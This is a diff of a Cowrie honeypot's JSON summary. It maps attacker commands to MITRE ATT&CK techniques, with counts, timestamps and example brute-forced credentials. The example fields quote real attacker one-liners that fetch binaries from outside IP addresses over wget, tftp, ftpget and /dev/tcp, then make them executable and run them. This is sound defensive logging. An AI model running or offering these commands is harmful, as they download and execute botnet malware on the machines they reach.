@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-17 09:01:45",
+  "generated": "2026-09-17 10:04:11",
   "totals": {
-    "commands": 1720,
-    "login_failed": 2009,
-    "login_success": 583,
-    "sessions": 2161
+    "commands": 1753,
+    "login_failed": 2029,
+    "login_success": 586,
+    "sessions": 2180
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2009,
+      "count": 2029,
       "examples": [
         "root / 123123123a",
         "monish / monish123",
@@ -21,14 +21,14 @@
         "ubuntu / password"
       ],
       "first": "2026-09-17T00:00:04.955790Z",
-      "last": "2026-09-17T08:55:29.154257Z",
-      "unique_ips": 44
+      "last": "2026-09-17T09:58:17.658073Z",
+      "unique_ips": 46
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 583,
+      "count": 586,
       "examples": [
         "ubuntu / ubuntu",
         "admin / GeNeXiS@19",
@@ -37,8 +37,8 @@
         "root / 1234"
       ],
       "first": "2026-09-17T00:00:32.153729Z",
-      "last": "2026-09-17T08:55:31.605263Z",
-      "unique_ips": 30
+      "last": "2026-09-17T10:00:55.578779Z",
+      "unique_ips": 33
     },
     {
       "id": "T1083",
@@ -54,46 +54,50 @@
       "unique_ips": 2
     },
     {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 25,
+      "examples": [
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh;",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "nohup bash -c \"exec 6<>/dev/tcp/8.219.71.198/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/1CPYIMbQTF && chmod +x",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
+      ],
+      "first": "2026-09-17T00:56:22.261587Z",
+      "last": "2026-09-17T10:00:55.859069Z",
+      "unique_ips": 7
+    },
+    {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 19,
+      "count": 24,
       "examples": [
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh;"
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh;",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
       ],
       "first": "2026-09-17T00:56:22.261587Z",
-      "last": "2026-09-17T04:07:32.156077Z",
-      "unique_ips": 4
+      "last": "2026-09-17T10:00:56.560176Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 11,
       "examples": [
         "uname -a",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "uname -s -m"
       ],
       "first": "2026-09-17T00:00:44.711432Z",
-      "last": "2026-09-17T08:55:33.847975Z",
-      "unique_ips": 8
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 9,
-      "examples": [
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh;",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "nohup bash -c \"exec 6<>/dev/tcp/8.219.71.198/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/1CPYIMbQTF && chmod +x"
-      ],
-      "first": "2026-09-17T00:56:22.261587Z",
-      "last": "2026-09-17T08:39:39.372197Z",
-      "unique_ips": 5
+      "last": "2026-09-17T09:13:45.164107Z",
+      "unique_ips": 9
     },
     {
       "id": "T1059.004",
@@ -125,13 +129,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-17T02:06:52.681180Z",
-      "last": "2026-09-17T08:39:39.372197Z",
-      "unique_ips": 2
+      "last": "2026-09-17T09:24:09.937067Z",
+      "unique_ips": 3
     },
     {
       "id": "T1095",
@@ -161,15 +166,19 @@
   "unmapped": [
     [
       "sh",
-      554
+      555
     ],
     [
       "system",
-      552
+      553
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
     ],
     [
       "shell",
-      5
+      6
     ],
     [
       "echo SHELL_TEST",
@@ -208,16 +217,16 @@
       2
     ],
     [
-      "/bin/busybox",
+      "enable",
       2
     ],
     [
-      "enable",
-      1
+      "linuxshell",
+      2
     ],
     [
-      "linuxshell",
-      1
+      "/bin/busybox",
+      2
     ],
     [
       "ping ; s",
@@ -233,10 +242,6 @@
     ],
     [
       "/bin/busybox echo > /var/.b && sh /var/.b && cd /var/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/",
       1
     ]
   ]
